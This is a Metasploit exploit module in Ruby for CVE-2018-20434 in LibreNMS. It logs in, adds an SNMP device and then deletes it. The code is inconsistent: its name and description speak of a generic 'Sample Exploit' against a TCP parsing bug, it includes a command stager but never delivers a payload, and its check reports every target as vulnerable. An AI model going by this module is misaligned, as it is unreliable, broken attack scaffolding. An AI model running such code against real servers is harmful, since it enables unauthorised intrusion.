##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Exploit::Remote::HttpClient
  include Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Sample Exploit',
      'Description'    => %q(
          This exploit module illustrates how a vulnerability could be exploited
        in an TCP server that has a parsing bug.
      ),
      'License'        => MSF_LICENSE,
      'Author'         =>
      [
        'mhaskar',       # Vulnerability discovery and PoC
        'Shelby Pace'    # Metasploit module
      ],
      'References'     =>
        [
          [ 'CVE', '2018-20434' ],
          [ 'URL', 'https://shells.systems/librenms-v1-46-remote-code-execution-cve-2018-20434/' ],
          [ 'URL', 'https://gist.github.com/mhaskar/516df57aafd8c6e3a1d70765075d372d' ]
        ],
      'Payload'        =>
        {
          'Space'    => 1000
        },
      'Targets'        =>
        [
          [
            'linux',
            {
              'Platform' => 'linux'
            }
          ]
        ],
      'DisclosureDate' => "Dec 24 2018",
      'DefaultTarget'  => 0
    ))

    register_options(
    [
      OptString.new('TARGETURI', [ true, 'Base LibreNMS path', '/' ]),
      OptString.new('USERNAME', [ true, 'User name for LibreNMS', '' ]),
      OptString.new('PASSWORD', [ true, 'Password for LibreNMS', '' ])
    ])
  end

  def check
    Exploit::CheckCode::Vulnerable
  end

  def login
    login_uri = normalize_uri(target_uri.path, 'login')
    res = send_request_cgi('method' =>  'GET', 'uri'  =>  login_uri)
    fail_with(Failure::NotFound, 'Failed to access the login page') unless res

    token = res.get_html_document.at('input[@name="_token"]/@value')
    fail_with(Failure::NotFound, 'Failed to retrieve token') unless token

    token = token.text
    vprint_status('Retrieved token')
    cookies = res.get_cookies

    login_res = send_request_cgi(
      'method'    =>  'POST',
      'uri'       =>  login_uri,
      'cookie'    =>  cookies,
      'vars_post' =>
      {
        'username'  =>  datastore['USERNAME'],
        'password'  =>  datastore['PASSWORD'],
        '_token'    =>  token,
        'submit'    =>  ''
      }
    )

    fail_with(Failure::NotFound, 'Failed to log in') unless login_res
    vprint_status('Successfully logged into LibreNMS')

    login_res.get_cookies
  end

  def add_device(cookies)
    add_uri = normalize_uri(target_uri.path, 'addhost')
    hostname = Rex::Text.rand_text_alpha(6...12).to_s

    res = send_request_cgi(
      'method'    =>  'POST',
      'uri'       =>  add_uri,
      'cookie'    =>  cookies,
      'vars_post'  =>
      {
        'authlevel'       =>  'noAuthNoPriv',
        'snmp'            =>  'on',
        'force_add'       =>  'on',
        'snmpver'         =>  'v2c',
        'hostname'        =>  hostname,
        'community'       =>  'blahblah',
        'authalgo'        =>  'MD5',
        'cryptoalgo'      =>  'AES',
        'transport'       =>  'udp',
        'port_assoc_mode' =>  'ifIndex',
        'Submit'          =>  ''
      }
    )

    fail_with(Failure::NotFound, 'Failed to add device') unless res && res.body.include?('Device added')
    vprint_good("Successfully added device with hostname #{hostname}")

    host_id = res.get_html_document.search('div[@class="alert alert-success"]/a[@href]').text
    fail_with(Failure::NotFound, 'Couldn\'t retrieve the id for the device') if host_id.empty?
    host_id = host_id.match(/(\d+)/).nil? ? nil : host_id.match(/(\d+)/)[0]

    fail_with(Failure::NotFound, 'Failed to retrieve a valid device id') if host_id.nil?

    host_id
  end

  def del_device(id, cookies)
    del_uri = normalize_uri(target_uri.path, 'delhost')
    res = send_request_cgi(
      'method'    =>  'POST',
      'uri'       =>  del_uri,
      'cookie'    =>  cookies,
      'vars_post' =>
      {
        'id'      =>  id,
        'confirm' =>  1
      }
    )

    print_status('Failed to delete device. Manual deletion may be needed') unless res

    vprint_good("Successfully deleted device with id ##{id}") if res
  end

  def exploit
    cookies = login

    host_id = add_device(cookies)
    del_device(host_id, cookies)
  end
end
